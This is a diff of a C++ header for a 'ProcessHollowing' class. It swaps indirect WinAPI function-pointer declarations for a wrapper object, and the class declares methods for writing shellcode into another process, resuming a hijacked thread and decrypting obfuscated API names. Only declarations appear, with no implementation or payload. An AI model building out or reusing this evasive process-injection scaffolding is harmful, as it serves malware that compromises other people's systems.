@@ -3,7 +3,9 @@
 #include <vector>
 #include <string>
 #include <iostream>
+#include "system_utils\WinAPIWrapper.h"
 
+/*
 typedef BOOL(WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
 typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
@@ -23,6 +25,7 @@ extern pVirtualAllocEx		VirtualAllocEx_Indirect;
 extern pReadProcessMemory	ReadProcessMemory_Indirect;
 extern pNtUnmapViewOfSection NtUnmapViewOfSection_Indirect;
 extern pGetThreadContext	GetThreadContext_Indirect;
+*/
 
 class ProcessHollowing {
 public:
@@ -35,5 +38,6 @@ private:
 	PVOID WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode);
 	VOID SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress);
 	std::string DecryptFunctionName(std::vector<unsigned char>& encryptedName, unsigned char key);
-	VOID InitializeIndirectCalls();
+
+	WinAPIWrapper api;
 };
